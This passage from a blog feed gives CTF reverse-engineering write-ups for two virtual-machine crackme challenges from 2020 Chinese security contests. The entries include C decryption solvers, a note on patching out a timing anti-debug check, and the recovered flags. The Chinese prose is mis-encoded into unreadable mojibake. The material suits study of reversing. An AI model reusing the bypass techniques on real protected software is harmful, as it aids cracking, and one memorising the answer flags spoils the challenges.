class="number">8</span>*i))+<span class="number">1</span>))*<span class="number">0x10</span> + *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)key)+<span class="number">0</span>);</span><br><span class="line">delat += <span class="number">0x61c88647</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">0x30</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, enc[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬å…­å±Šä¸Šæµ·å¸‚å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨å¤§èµ›</title>
      <link href="/2020/11/15/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
      <url>/2020/11/15/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>2ä¸ªè™šæ‹Ÿæœºç±»å‹çš„é¢˜ç›®ã€‚å¾ˆé«˜å…´è¿›äº†çº¿ä¸‹ï¼Œé˜Ÿä¼æœ€åç¬¬2å/ã€‚<a id="more"></a></p><p><img src="/2020/11/15/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/909254_NE362J9P4YSEMAR.png" alt="909254_NE362J9P4YSEMAR"></p><h3 id="çœŸæ­£çš„Babyre"><a href="#çœŸæ­£çš„Babyre" class="headerlink" title="çœŸæ­£çš„Babyre"></a>çœŸæ­£çš„Babyre</h3><p>idaå¼€å§‹ç›´æ¥æœç´¢å­—ç¬¦ä¸²ï¼Œæ‰¾åˆ°å…³é”®å‡½æ•°ï¼Œç®€å•ä¿®å¤ä¸€ä¸‹æ ˆæŒ‡é’ˆï¼Œç›´æ¥F5ã€‚</p><p>å¼€å§‹æ€»æ„Ÿè§‰è‡ªå·±çœ‹åˆ°çš„æ˜¯å‡çš„æµç¨‹ï¼ŒæŠŠç¨‹åºç¿»äº†ä¸ªéï¼Œæ²¡å‘ç°å…¶å®ƒçš„æµç¨‹ï¼Œä½†æ˜¯å‘ç°äº†å‡ ä¸ªåè°ƒè¯•ï¼Œä½†æ˜¯è°ƒè¯•å‘ç°ç¨‹åºéƒ½æ²¡æœ‰ä½¿ç”¨ã€‚ã€‚ã€‚å…¶ä¸­äºŒä¸ªï¼š</p><p><img src="/2020/11/15/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20201115110658656-1605414968987.png" alt="image-20201115110658656"></p><p><img src="/2020/11/15/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20201114231613090-1605451277739.png" alt="image-20201114231613090"></p><p>ç„¶åç¡®å®šè¿™å°±æ˜¯ä¸€ä¸ªè™šæ‹Ÿæœºé€†å‘ã€‚é™æ€åˆ†æä¸€ä¸‹åç›´æ¥è®©ç¨‹åºè·‘èµ·æ¥ã€‚</p><p>è¿™é‡Œæˆ‘åšçš„æ—¶å€™å’Œå¤ç°çš„æ—¶å€™ï¼Œidaè¯†åˆ«çš„ç«Ÿç„¶ä¸ä¸€æ ·ï¼Œå¤ç°åˆ†æçš„æ›´ç®€æ´ã€‚è®°å¾—åšçš„æ—¶å€™ï¼Œæ¯æ¬¡èµ‹å€¼æ“ä½œç ä¸æ•°æ®çš„æ—¶å€™æ˜¯ä½¿ç”¨ä¸€ä¸ªå››å­—èŠ‚æ•°æ®æ¥ä¿å­˜çš„ï¼Œå…¶ä¸­L0BYTEï¼ŒByte1ï¼ŒByte2ï¼ŒHIByteéƒ½æ˜¯ä¸åŒçš„å«ä¹‰ï¼š</p><p>åšçš„æ—¶å€™çš„ä¸€äº›ç¬”è®°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æµ‹è¯•flagã€‚</span></span><br><span class="line">flag&#123;<span class="number">0123456789012345678901234567890</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æœ€åæ¯”è¾ƒçš„æ•°æ®ã€‚</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">31</span>,  <span class="number">24</span>,  <span class="number">15</span>, <span class="number">250</span>, <span class="number">184</span>,  <span class="number">99</span>, <span class="number">100</span>, <span class="number">137</span>,  <span class="number">24</span>, <span class="number">104</span>, </span><br><span class="line">  <span class="number">124</span>,  <span class="number">25</span>,  <span class="number">20</span>,  <span class="number">45</span>, <span class="number">125</span>,  <span class="number">88</span>,   <span class="number">0</span>,  <span class="number">30</span>,  <span class="number">84</span>, <span class="number">106</span>, </span><br><span class="line">   <span class="number">65</span>,  <span class="number">60</span>,  <span class="number">54</span>,  <span class="number">62</span>,  <span class="number">86</span>,  <span class="number">19</span>,   <span class="number">4</span>,  <span class="number">59</span>,  <span class="number">46</span>,  <span class="number">75</span>, </span><br><span class="line">  <span class="number">121</span>,  <span class="number">67</span>, <span class="number">122</span>,  <span class="number">34</span>,  <span class="number">69</span>, <span class="number">110</span>,  <span class="number">58</span>, <span class="number">117</span>,  <span class="number">38</span>, <span class="number">200</span>, </span><br><span class="line">  <span class="number">192</span>, <span class="number">142</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LOBYTEï¼š%<span class="number">64</span> index</span><br><span class="line">BYTE2: å¼€å§‹ä¸LOBYTEå€¼ç›¸åŒï¼Œåšè¿ç®—å®Œçš„èµ‹å€¼index</span><br><span class="line">BYTE1: xor input[]  opcode: <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>ï¼šBYTE1 &amp;= LOBYTE;</span><br></pre></td></tr></table></figure><p>ç„¶åç¨‹åºä¸­ä½¿ç”¨äº†çš„ä¸€ä¸ªåè°ƒè¯•ï¼ˆæ—¶é’Ÿæ£€æµ‹ï¼‰ï¼šç®€å•patchäº†å³å¯ã€‚</p><p><img src="/2020/11/15/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20201115001246130-1605451277740.png" alt="image-20201115001246130"></p><p>ä¹ä¸€çœ‹ç¨‹åºæµç¨‹æœ‰ç‚¹å¤æ‚ï¼Œæ„Ÿè§‰è¾“å…¥çš„æ•°æ®ä¼šåº”è¯¥ä¸‹ä¸€æ­¥æ“ä½œç ï¼Œè¿™ä¸ªå…¶å®å°±æ˜¯ä¸€ä¸ªåŠ å¯†æ“ä½œã€‚</p><p>æ€»ç»“ä¸€ä¸‹ç¨‹åºçš„åŠ å¯†æ“ä½œï¼ˆå¯¹æ‰€æœ‰å­—ç¬¦ä¸²çš„åŠ å¯†éƒ½æ˜¯è¿™ä¸ªæ“ä½œï¼‰ï¼šé¦–å…ˆä»æ“ä½œç ä¸­å–å‡ºä¸€ä¸ªæ•°æ®<strong>op_data</strong> ï¼Œç„¶åtemp  = input[i]^op_dataï¼Œå†è®©op_data &amp;= input[i]ï¼Œinput[i] = tempï¼Œä¸€ç›´è¿™ä¸ªå¾ªç¯ç›´åˆ°op_data == 0ï¼Œæœ€åå–å‡ºinput[i+1]è¿›è¡Œinput[i] ^= input[i+1]ã€‚ä¸€ç›´è¿™æ ·å¯¹æ‰€æœ‰çš„inputåŠ å¯†2éï¼Œå°±æ˜¯ä½¿ç”¨op_dataä¸åŒã€‚</p><p>ä½¿ç”¨ida_pythonå¯¼å‡ºæˆ‘ä»¬è¦ç”¨çš„op_dataã€‚</p><p>æŒ‰ç…§ç¨‹åºçš„ç®—æ³•ï¼Œé€†äºŒæ¬¡å³å¯ï¼šç¬¬ä¸€æ¬¡è§£å¯†è¿‡ç¨‹æˆ‘è¿›è¡Œäº†æ³¨é‡Šã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">31</span>,  <span class="number">24</span>,  <span class="number">15</span>, <span class="number">250</span>, <span class="number">184</span>,  <span class="number">99</span>, <span class="number">100</span>, <span class="number">137</span>,  <span class="number">24</span>, <span class="number">104</span>, </span><br><span class="line">  <span class="number">124</span>,  <span class="number">25</span>,  <span class="number">20</span>,  <span class="number">45</span>, <span class="number">125</span>,  <span class="number">88</span>,   <span class="number">0</span>,  <span class="number">30</span>,  <span class="number">84</span>, <span class="number">106</span>, </span><br><span class="line">   <span class="number">65</span>,  <span class="number">60</span>,  <span class="number">54</span>,  <span class="number">62</span>,  <span class="number">86</span>,  <span class="number">19</span>,   <span class="number">4</span>,  <span class="number">59</span>,  <span class="number">46</span>,  <span class="number">75</span>, </span><br><span class="line">  <span class="number">121</span>,  <span class="number">67</span>, <span class="number">122</span>,  <span class="number">34</span>,  <span class="number">69</span>, <span class="number">110</span>,  <span class="number">58</span>, <span class="number">117</span>,  <span class="number">38</span>, <span class="number">200</span>, </span><br><span class="line">  <span class="number">192</span>, <span class="number">142</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> a1[] = &#123;<span class="number">9</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">10</span>,</span><br><span class="line"> <span class="number">4</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">9</span>,</span><br><span class="line">  <span class="number">14</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">7</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> b[] = &#123;<span class="number">13</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">12</span>,</span><br><span class="line">   <span class="number">13</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">7</span>,</span><br><span class="line"> <span class="number">13</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">10</span>&#125;;</span><br><span class="line">     </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> c[] = &#123;<span class="number">3</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">20</span>, <span class="number">228</span>, <span class="number">95</span>, <span class="number">11</span>, <span class="number">116</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">113</span>, <span class="number">1</span>, <span class="number">17</span>, <span class="number">3</span>, <span class="number">32</span>, <span class="number">85</span>, <span class="number">6</span>, <span class="number">19</span>, <span class="number">5</span>, <span class="number">94</span>, <span class="number">2</span>, <span class="number">72</span>, <span class="number">105</span>, <span class="number">91</span>, <span class="number">86</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">15</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">84</span>, <span class="number">37</span>, <span class="number">14</span>, <span class="number">94</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">88</span>, <span class="number">123</span>, <span class="number">65</span>, <span class="number">135</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*int i = 0, j = 0;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">ida_chars[41] = 135;</span></span><br><span class="line"><span class="comment">for(j = 40; j &gt;= 0; j--)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">ida_chars[j] ^= ida_chars[j+1];</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">for(i = 0; i &lt; 255; i++)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">unsigned char temp = i, temp1 = i;</span></span><br><span class="line"><span class="comment">unsigned char a = b[j];</span></span><br><span class="line"><span class="comment">while(1)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">temp1 ^= a;</span></span><br><span class="line"><span class="comment">a &amp;= temp;</span></span><br><span class="line"><span class="comment">a *= 2;</span></span><br><span class="line"><span class="comment">temp = temp1;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">if(a == 0)</span></span><br><span class="line"><span class="comment">break;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">if(temp == ida_chars[j])</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">ida_chars[j] = i;</span></span><br><span class="line"><span class="comment">break;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">for(i = 0; i &lt; 42; i++)</span></span><br><span class="line"><span class="comment">printf("%d, ", ida_chars[i]);*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">c[<span class="number">41</span>] = <span class="number">125</span>;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">40</span>; j &gt;= <span class="number">0</span>; j--)</span><br><span class="line">&#123;</span><br><span class="line">c[j] ^= c[j+<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">255</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> temp = i, temp1 = i;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> a = a1[j];</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">temp1 ^= a;</span><br><span class="line">a &amp;= temp;</span><br><span class="line">a *= <span class="number">2</span>;</span><br><span class="line">temp = temp1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(a == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(temp == c[j])</span><br><span class="line">&#123;</span><br><span class="line">c[j] = i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, c[i]);</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//flag&#123;e1750505-7a05-4de9-a333-72ec8cd26a78&#125;</span></span><br></pre></td></tr></table></figure><h3 id="ctfvm"><a href="#ctfvm" class="headerlink" title="ctfvm"></a>ctfvm</h3><p>ä»é¢˜ç›®åå­—å¯çŸ¥é“æ˜¯è™šæ‹Ÿæœºé€†å‘ã€‚åœ¨linuxä¸­è¿è¡Œä¸€ä¸‹ï¼Œçœ‹è§å­—ç¬¦ä¸²ä¿¡æ¯ã€‚</p><p>idaä¸­æœç´¢ä¸€åœˆå¹¶æ²¡æœ‰å‘ç°ä»»ä½•ç›¸å…³å­—ç¬¦ä¸²ï¼Œé‚£å°±æ˜¯ç¨‹åºè¿è¡Œæ—¶è§£å¯†å‡ºç›¸å…³å­—ç¬¦ä¸²ã€‚ä»å…¥å£ç‚¹æ‰¾åˆ°mainå‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°464è¡Œçš„ä»£ç ï¼Œåˆ†æ”¯æå…¶å¤šã€‚ã€‚<img src="/2020/11/15/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20201114224414324-1605451277740.png" alt="image-20201114224414324"></p><p>é™æ€åˆ†ææ˜¯ä¸å¯èƒ½äº†ï¼Œç›´æ¥åŠ¨è°ƒã€‚</p><p>å¼€å§‹æ…¢æ…¢çš„è°ƒè¯•çœ‹å“ªé‡Œè§£å¯†å­—ç¬¦ä¸²çš„ï¼Œä½†å®åœ¨æ˜¯å†—é•¿ï¼Œç›´æ¥åœ¨whileå¾ªç¯ä¸‹æ–­ï¼Œç„¶åF9ä¸€ç›´è·‘ï¼Œç›´åˆ°ç¨‹åºç­‰å¾…æˆ‘ä»¬è¾“å…¥ã€‚</p><p>éšä¾¿è¾“å…¥åï¼Œå¼€å§‹æ…¢æ…¢è·Ÿè¿›ç†Ÿæ‚‰ä¸€äº›å‡½æ•°çš„åŠŸèƒ½ï¼Œå‘ç°å¼€å§‹å°±æ˜¯åœ¨ä»¥æ­¤å–æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦å­˜å…¥ä¸€ä¸ªå¤§æ•°ç»„ä¸­</p><p><img src="/2020/11/15/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20201114225040904-1605451277740.png" alt="image-20201114225040904"></p><p>ç»§ç»­è·Ÿè¸ªï¼Œåˆ†æåˆ°æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦é•¿åº¦è¦æ˜¯38ï¼Œè™½ç„¶è¯»å–äº†æœ€åçš„å›è½¦ç¬¦ï¼Œä½†æ˜¯æ²¡æœ‰ä½¿ç”¨çš„ã€‚</p><p>å…¶ä¸­ç¨‹åºä¸­è¿™ä¸ªå†…å­˜åŒºåŸŸç±»ä¼¼å°±æ˜¯vmä½¿ç”¨çš„å¯„å­˜å™¨ã€‚</p><p><img src="/2020/11/15/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20201114230655880-1605451277741.png" alt="image-20201114230655880"></p><p>æ¥ä¸‹æ¥åˆ¤æ–­æˆ‘ä»¬è¾“å…¥æœ€åä¸€ä½æ˜¯ä¸æ˜¯ â€˜}â€˜ å­—ç¬¦ï¼Œå†æŠŠé™¤äº†flag{ }ä¸­çš„å†…å®¹å¤åˆ¶åˆ°ä¸ç¨‹åºæœ€ååšæ¯”è¾ƒçš„å­—ç¬¦ä¸²çš„ä¸‹é¢ï¼Œ</p><p><img src="/2020/11/15/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20201114230109551-1605451277741.png" alt="image-20201114230109551"></p><p>æ¥ç€åˆ¤æ–­æˆ‘ä»¬å¼€å§‹çš„5ä½æ˜¯ä¸æ˜¯ flag{ã€‚</p><p>æœ€åå°±æ˜¯ä»¥æ­¤å–å‡ºæˆ‘ä»¬flag{}ä¸­æ¯ä¸€ä½ï¼Œ<code>(0xFB*input[i])&amp;0xff</code>ï¼Œç„¶åä»¥æ­¤ä¸ä¸Šé¢çš„æ¯”è¾ƒå­—ç¬¦ä¸²æ¯”è¾ƒã€‚è§£å¯†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> a[] = &#123;<span class="number">237</span>, <span class="number">6</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">252</span>, <span class="number">227</span>, <span class="number">232</span>, <span class="number">6</span>, <span class="number">237</span>, <span class="number">11</span>, <span class="number">247</span>, <span class="number">247</span>, <span class="number">22</span>, <span class="number">6</span>, <span class="number">237</span>, <span class="number">27</span>, <span class="number">12</span>, <span class="number">252</span>, <span class="number">232</span>, <span class="number">12</span>, <span class="number">242</span>, <span class="number">22</span>, <span class="number">247</span>, <span class="number">2</span>, <span class="number">242</span>, <span class="number">17</span>, <span class="number">227</span>, <span class="number">227</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">247</span>, <span class="number">252</span>&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"flag&#123;"</span>);</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j++)</span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">32</span>; i &lt; <span class="number">127</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(((i*<span class="number">0xFB</span>)&amp;<span class="number">0xff</span>) == a[j])</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"&#125;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag&#123;72c149827155b27ad48d6b5f6c99fd54&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬ä¹å±Šå…¨å›½ç”µä¿¡å’Œäº’è”ç½‘è¡Œä¸šç½‘ç»œå®‰å…¨ç®¡ç†æŠ€èƒ½ç«èµ›</title>
      <link href="/2020/11/07/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B/"/>
      <url>/2020/11/07/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B/</url>
      
